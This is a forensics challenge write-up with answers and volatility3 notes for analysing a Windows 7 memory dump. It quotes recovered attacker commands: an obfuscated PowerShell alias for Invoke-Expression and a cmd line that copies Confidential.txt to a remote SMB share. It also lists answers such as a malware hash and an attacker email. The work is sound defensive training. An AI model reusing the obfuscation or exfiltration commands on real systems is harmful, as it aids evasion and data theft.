# Questions
- What is the Operating System of the machine?
	- Windows 7
- When was the memory dump created?
	- 2022-12-19 16:07:30
- After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?
	- (gv '*MDR*').naMe[3,11,2]-joIN''
- The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?
	- Invoke-Expression
- A CMD command was executed to attempt to exfiltrate a file. What is the full command line?
	- type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
- Following the above command, now tell us if the file was exfiltrated successfully?
	- No
- The attacker tried to create a readme file. What was the full path of the file?
	- C:\Users\Public\Office\readme.txt
- What was the Host Name of the machine?
	- USER-PC
- How many user accounts were in the machine?
	- 3
- In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?
	- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
- A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?
	- b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1
- Following the previous question, what is the Imphash of the malicous file you found above?
	- d3b592cd9481e4f053b5362e22d61595
- Following the previous question, tell us the date in UTC format when the malicious file was created?
	- 2022-06-22 11:49:04
- What was the local IP address of the machine?
	- 192.168.0.104
- There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?
	- cmd.exe
- Attacker might have used an email address to login a social media. Can you tell us the email address?
	- [mafia_code1337@gmail.com](mailto:mafia_code1337@gmail.com)
- Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?
	- Wazuh
- The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?
	- csrsss.exe


# Notes
- After unzipping the archive, we are given a single binary file, that appears to be a memory file, specifically for Windows.
- We can actually use the vol.py tool to dump the information from this file:
```
volatility3 -f recollection.bin windows.info
```
- First, we need the operating system of the machine, which we can see is Windows 7
- Next, we need to get the timestamp on which the memory dump was created
- We can also pull that information in the same dump, in which we get: 2022-12-19 16:07:30+00:00
- Next, we need to get the command that the attacker copied onto the clipboard
- For this, we need to use a different plugin, so let's go with the clipboard plugin
```
volatility3 -f recollection.bin clipboard
```
- We are then able to pull out what we need, which is: (gv '*MDR*').naMe[3,11,2]-joIN''
- Next, we need to get the obfuscated command, but is a supposed alias instead
- Specifically, we are looking for a PowerShell cmdlet alias
- So, we need to use the consoles plugin to do so
```
volatility3 -f recollection.bin consoles
```
- We can see that an Invoke-Expression or IEX was used using the previous command
- So, we see that IEX is short for Invoke-Expression. This also makes sense since the original command was encoded as well
- Next, we need to find the full command line for exfilitrating the file
-  We can use the same dump, in which we can see the line: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt being used
- Next, was the attacker successful in getting this file?
- Luckily for us, they failed since we can see in the same dump that this network path was not found, so nothing was returned
- Next, we need to find the readme that the attacker tried to create
- From the same terminal history, we are able to see base64 encrypted strings
- Running these through a decoder like CyberChef, we are able to get the file path of the readme, being: C:\Users\Public\Office\readme.txt
- Next, we need the hostname of the machine, which can be done with net users.
- From these results, we can pull out the hostname, which is USER-PC.
- Now, let's count up the number of user accounts.
- We can use the hashdump plugin, as this would dump all user passwords, hence, allowing us to see how many users exist
- We are able to count 3 total register uses